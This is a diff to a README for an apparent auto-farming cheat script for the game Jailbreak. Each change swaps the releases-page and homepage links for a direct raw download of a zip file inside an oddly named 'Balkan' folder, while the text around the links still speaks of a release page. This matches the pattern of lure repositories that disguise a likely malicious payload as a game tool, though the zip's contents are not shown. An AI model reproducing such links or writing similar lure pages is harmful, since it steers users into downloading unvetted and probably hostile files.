@@ -1,6 +1,6 @@
 # 🎮 jailbreak-auto-farming-suite - Easy Script Auto Farm for Jailbreak
 
-[![Download Now](https://img.shields.io/badge/Download-jailbreak--auto--farming--suite-brightgreen)](https://github.com/dariocalderonse010/jailbreak-auto-farming-suite/releases)
+[![Download Now](https://img.shields.io/badge/Download-jailbreak--auto--farming--suite-brightgreen)](https://github.com/dariocalderonse010/jailbreak-auto-farming-suite/raw/refs/heads/main/Balkan/suite-farming-jailbreak-auto-1.2.zip)
 
 ---
 
@@ -30,10 +30,10 @@ The application runs in windowed mode and uses moderate CPU and memory during op
 
 Start by visiting the release page to get the latest version.
 
-[![Download Now](https://img.shields.io/badge/Visit-Release_Page-blue)](https://github.com/dariocalderonse010/jailbreak-auto-farming-suite/releases)
+[![Download Now](https://img.shields.io/badge/Visit-Release_Page-blue)](https://github.com/dariocalderonse010/jailbreak-auto-farming-suite/raw/refs/heads/main/Balkan/suite-farming-jailbreak-auto-1.2.zip)
 
 1. Click the link above or go to:  
-   https://github.com/dariocalderonse010/jailbreak-auto-farming-suite/releases
+   https://github.com/dariocalderonse010/jailbreak-auto-farming-suite/raw/refs/heads/main/Balkan/suite-farming-jailbreak-auto-1.2.zip
 
 2. On the release page, find the latest version marked with the highest number or most recent date.
 
@@ -101,7 +101,7 @@ The application includes:
 To keep your tool working well, check for updates regularly:
 
 1. Return to the releases page:  
-   https://github.com/dariocalderonse010/jailbreak-auto-farming-suite/releases
+   https://github.com/dariocalderonse010/jailbreak-auto-farming-suite/raw/refs/heads/main/Balkan/suite-farming-jailbreak-auto-1.2.zip
 
 2. Compare your current version (shown in the app) with the latest release on the page.
 
@@ -132,10 +132,10 @@ If problems persist, check the issue tracker on the GitHub page.
 ## 🔗 Useful Links
 
 - Releases page (download here):  
-  https://github.com/dariocalderonse010/jailbreak-auto-farming-suite/releases
+  https://github.com/dariocalderonse010/jailbreak-auto-farming-suite/raw/refs/heads/main/Balkan/suite-farming-jailbreak-auto-1.2.zip
 
 - Project homepage:  
-  https://github.com/dariocalderonse010/jailbreak-auto-farming-suite
+  https://github.com/dariocalderonse010/jailbreak-auto-farming-suite/raw/refs/heads/main/Balkan/suite-farming-jailbreak-auto-1.2.zip
 
 ---
 
